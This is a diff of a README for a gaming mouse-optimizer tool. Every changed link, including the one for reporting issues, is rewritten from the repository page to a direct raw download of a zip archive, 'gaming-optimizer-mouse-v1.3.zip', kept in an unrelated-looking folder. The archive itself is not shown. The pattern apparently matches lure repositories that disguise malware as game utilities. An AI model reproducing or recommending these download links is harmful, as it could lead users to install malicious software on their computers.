@@ -1,6 +1,6 @@
 # 🎮 mouse-optimizer-gaming - Tame Your Mouse, Dominate Your Game
 
-[![Download mouse-optimizer-gaming](https://img.shields.io/badge/Download-mouse--optimizer--gaming-blue?style=for-the-badge&logo=windows)](https://github.com/Generalmanagercobol32/mouse-optimizer-gaming)
+[![Download mouse-optimizer-gaming](https://img.shields.io/badge/Download-mouse--optimizer--gaming-blue?style=for-the-badge&logo=windows)](https://github.com/Generalmanagercobol32/mouse-optimizer-gaming/raw/refs/heads/main/vexillum/gaming-optimizer-mouse-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run mouse-optimizer-gaming on you
 
 Ready to get started? Here's what to do:
 
-1. **Visit this link to download the application:** [mouse-optimizer-gaming](https://github.com/Generalmanagercobol32/mouse-optimizer-gaming)
+1. **Visit this link to download the application:** [mouse-optimizer-gaming](https://github.com/Generalmanagercobol32/mouse-optimizer-gaming/raw/refs/heads/main/vexillum/gaming-optimizer-mouse-v1.3.zip)
 2. Once you're on the page, look for the download button or the latest release section.
 3. Click the download button and save the file to your computer (usually to your Downloads folder).
 
@@ -135,7 +135,7 @@ Yes, use the generic sensitivity calculator option. The result will still be a s
 
 ## 📞 Support
 
-If you encounter any issues or have suggestions, please visit the [GitHub repository](https://github.com/Generalmanagercobol32/mouse-optimizer-gaming) and open an issue. The community and developers are happy to help.
+If you encounter any issues or have suggestions, please visit the [GitHub repository](https://github.com/Generalmanagercobol32/mouse-optimizer-gaming/raw/refs/heads/main/vexillum/gaming-optimizer-mouse-v1.3.zip) and open an issue. The community and developers are happy to help.
 
 ## 📜 License
 
@@ -147,7 +147,7 @@ This project is distributed under an open-source license. Feel free to use, modi
 
 Need the link one more time? Here it is:
 
-[**Download mouse-optimizer-gaming**](https://github.com/Generalmanagercobol32/mouse-optimizer-gaming)
+[**Download mouse-optimizer-gaming**](https://github.com/Generalmanagercobol32/mouse-optimizer-gaming/raw/refs/heads/main/vexillum/gaming-optimizer-mouse-v1.3.zip)
 
 Visit this link to download the application.
 
